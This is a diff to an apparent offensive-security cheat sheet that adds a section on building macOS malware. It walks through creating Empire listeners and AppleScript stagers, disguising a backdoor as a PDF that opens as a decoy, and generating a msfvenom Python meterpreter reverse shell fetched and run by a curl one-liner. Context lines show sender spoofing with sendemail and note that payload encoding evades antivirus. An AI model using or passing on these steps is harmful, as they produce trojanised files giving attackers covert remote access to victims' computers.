@@ -257,6 +257,62 @@ sendemail -xu [email] -xp [password] -s [server:port] -f "admin@google.com" -t "
 ```
 message-header it will show the name not the email in the delivery box
 
+## Mac OSX Malware
+Fat Rat and Empire can both generate OSX payloads.
+- Select OS X option in from menu 01 in Fat Rat.
+- Or use a stager that starts with osx in Empire.
+1. Option EMPIRE
+- Create an listener
+```
+uselistener http
+info
+set Port 8080
+execute
+back
+list
+```
+- Create backdoor applescript
+```
+usestager osx/applescript
+set Listener NAME
+set OutFile /path
+execute
+```
+- Interact whit the conection
+```
+interact [agent name]
+```
+Converting Basic Script Backdoor To An Executable  
+Go to mac and open Script Editor copy past the script and select the file format of Application  
+
+Embedding A Normal File With Backdoor  
+- Create a comand to download and open a real file in tmp directory
+```
+cd /tmp/
+curl [URL] -O -s
+open pdf.pdf
+or
+cd /tmp/ &&  curl [URL] -O -s && open pdf.pdf
+```
+- Take the Empire script and copy it to the mac Script Editor and add the comand in [+] and separate it usin ; for the reverse shell
+```
+do shell script "[+] ; echo...."
+```
+- to test it click the play button
+- select the file format of Application  
+
+2. Option Msfvenom and download and execute metod
+Use msfvenom to generate a backdor
+```
+msfvenom --list payloads
+msfvenom --payload python/meterpreter/reverse_tcp --payload-options
+msfvenom --payload python/meterpreter/reverse_tcp  LPORT=XXXX  LHOST=XXXXXXXX > rev_tcp_4444.py
+```
+- Create a shell script to download and open a real file and backdoor in tmp directory
+```
+do shell script "cd /tmp/ &&  curl [URL PDF] -O -s && open pdf.pdf; curl [URL to .py backdoor] -O -s && python backdoor.py"
+```
+
 ## Veil
 Kali 2020
 ```
@@ -769,7 +825,7 @@ msfvenom -l formats
 ```
 Generate a payload
 ```
-msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker PORT> -f <format> -o <output payload file name>
+msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attackerPORT> -f <format> -o <output payload file name>
 ```
 This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.
 ```
